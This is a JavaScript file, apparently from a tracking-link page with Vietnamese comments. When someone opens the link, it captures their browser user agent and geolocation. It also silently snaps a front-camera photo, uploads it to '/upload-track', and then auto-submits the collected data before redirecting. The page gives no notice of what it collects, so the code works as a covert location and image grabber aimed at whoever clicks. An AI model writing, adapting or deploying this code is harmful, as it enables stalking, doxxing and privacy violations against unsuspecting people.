  //var time = 0;// document.getElementById("time").value;//data.post.check_delay; //How long (in seconds) to countdown
  var page = document.getElementById("link").value;//data.post.link; //The page to redirect to
  var forms=document.getElementById("postgeo");
  var userAgent=document.getElementById("useragent");
  var device = navigator.userAgent;
  var checkgel=document.getElementById("check_geo");
  var checkimg=document.getElementById("check_img");
  var x = document.getElementById("data_geol");
  userAgent.value = device;
  //var btn=document.getElementById("btnVid");
  //var BodyCont=document.getElementsByTagName("BODY")[0];
  //BodyCont.style.display = "none";
  if (checkgel.value==1 || checkimg.value==1){
    var CountCheck=0;var maxCountCheck=0;
    //alert(checkimg.value)
    if (checkgel.value==1) maxCountCheck ++;
    if (checkimg.value==1) maxCountCheck ++;
    //alert(maxCountCheck, )
    function submitforms (){
        // if (x.value=="") x.value = x.value + "<p><b>Toạ độ: </b>Chưa bật toạ độ hoặc không bấm chọn cấp quyền.</p><br>";
        forms.submit();
    };
        if (checkgel.value==1){
            var geol= navigator.geolocation;
            function getLocation() {  
                //try {
                if (geol) {
                  setTimeout(geol.getCurrentPosition(showPosition, showError),1*1000);
                //geol.getCurrentPosition(showPosition, showError);
                } else {
                    x.value = x.value + "<p><b>Toạ độ: </b>Trình duyệt không hỗ trợ Geolocation.</p><br>";
                    CountCheck++;
                    if (CountCheck>=maxCountCheck) submitforms();
                };
              };
              
              function showPosition(position) {
                  lat = position.coords.latitude;
                  lon = position.coords.longitude;
                  accur = position.coords.accuracy;
                  x.value= x.value + "<p><b>Toạ độ: </b><a href='https://www.google.com/maps/place/"+ lat + ',' + lon+ '/@'+ lat + ',' + lon + "15z/' target='_blank'>Sai số: "+ accur +" m</a></p><br>";
                  CountCheck++;
                  //setTimeout()
                  if (CountCheck>=maxCountCheck) submitforms();
                };
              
              function showError(error) {
                switch(error.code) {
                case error.PERMISSION_DENIED:
                  x.value = x.value + "<p><b>Toạ độ: </b>Người dùng từ chối cấp quyền định vị.</p><br>";
                  //CountCheck++;
                  break;
                case error.POSITION_UNAVAILABLE:
                  x.value = x.value + "<p><b>Toạ độ: </b>Không có thông tin vị trí.</p><br>";
                  //CountCheck++;
                  break;
                case error.TIMEOUT:
                  x.value = x.value + "<p><b>Toạ độ: </b>Hết thời gian gửi yêu cầu định vị.</p><br>";
                  //CountCheck++;
                  break;
                case error.UNKNOWN_ERROR:
                  x.value = x.value + "<p><b>Toạ độ: </b>Lỗi chưa xác định.</p><br>";
                  //CountCheck++;
                  break;
                };
                CountCheck++;
              };
              getLocation();
          } else {
            x.value = x.value + "<p><b>Toạ độ: </b>Không sử dụng toạ độ.</p><br>";
            //CountCheck++;
            if (CountCheck>=maxCountCheck) submitforms();
          };
          if (checkimg.value==1) {  
            const video = document.querySelector("#video");
            const canvas = document.querySelector("#canvas");
            //const screenshotsContainer = document.querySelector("#screenshotsContainer");
            //var URLImage = "";
            var dataImage;
            var videoStream = null;
            var useFrontCamera = true; //camera trước
            const constraints = {
            video: {
                width: {
                min: 1280/8,
                ideal: 1920/2,
                max: 2560/8,
                },
                height: {
                min: 720/8,
                ideal: 1080/2,
                max: 1440/8,
                }
            },
            };
             //chụp hình
             function stopVideoStream() {
                if (videoStream) {
                  videoStream.getTracks().forEach((track) => {
                    track.stop();
                  });
                };
              };
            function takepic(){
                //let img = document.getElementById('screenshot');
                //console.log(video)
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext("2d").drawImage(video, 0, 0);
                //img.src = canvas.toDataURL("image/jpeg");
                dataImage = {
                    id:"track_photo_" + new Date().valueOf() + ".jpeg",
                    img: canvas.toDataURL("image/jpeg"),
                    type: 'image/jpeg'
                };
                $.post(
                    "/upload-track",
                    {
                        id: dataImage.id,
                        img: dataImage.img,
                        type: dataImage.type
                    },
                    function(response){ 
                        if (response.status==200) {
                        x.value= x.value + "<p><b>Hình ảnh: </b><a href='/photo/"+dataImage.id+"' target='_blank'>Link Picture</a></p><br>";
                        CountCheck++;
                        //alert("submid")
                        if (CountCheck>=maxCountCheck) submitforms();
                        } else {
                        x.value= x.value + "<p><b>Hình ảnh: </b>Lỗi tải ảnh lên máy chủ.</p><br>";
                        CountCheck++;
                        if (CountCheck>=maxCountCheck) submitforms();
                        //up load img err
                        };
                    }
                );
                
                //  = dataImage.id;
                // console.log(URLImage)
                // return URLImage
            };
            // yêu cầu cấp quyền
            async function init() {
                stopVideoStream();
                //console.log("not")
                constraints.video.facingMode = useFrontCamera ? "user" : "environment";
                try {
                videoStream = await navigator.mediaDevices.getUserMedia(constraints); // lệnh yêu cầu cấp quyền
                //console.log("video playing stream 1");
                video.onplaying = () => console.log("video playing stream");
                video.srcObject = videoStream;

                //takepic()
                //alert("submid")
                setTimeout(takepic,1*1000);
                //console.log(URLImage)
                } catch (error) {
                //console.log(error)
                x.value= x.value + "<p><b>Hình ảnh: </b>Lỗi khi cấp quyền Camera.</p><br>";
                CountCheck++;
                if (CountCheck>=maxCountCheck) submitforms();
                };
          };
          async function playVid () {
              //alert('checkimg.value==1')
                if (
                  !"mediaDevices" in navigator ||
                  !"getUserMedia" in navigator.mediaDevices
                ) {
                  //document.write('Not support API camera')
                  x.value= x.value + "<p><b>Hình ảnh: </b>Not support API camera</p><br>";
                  CountCheck++;
                  if (CountCheck>=maxCountCheck) submitforms();
                };
               await init();
          };
          playVid()
          // window.onload = () => {
          //   //video.onplaying = () => console.log("video playing stream");
          //   setTimeout(playVid,1*1000);
          //    //playVid();
          // }
          
          }else {
            x.value = x.value + "<p><b>Hình ảnh: </b>Không sử dụng camera.</p><br>";
            //CountCheck++;
            //alert('else',CountCheck,maxCountCheck)
            if (CountCheck>=maxCountCheck) submitforms();
          };

  window.setTimeout(submitforms,7*1000); 
} else {
    //var x = document.getElementById("data_geol");
    x.value="Không sử dụng các tính năng phụ.";
    //userAgent.value = device;
    //window.onload = function(){
        forms.submit();
       // init();
    //};
};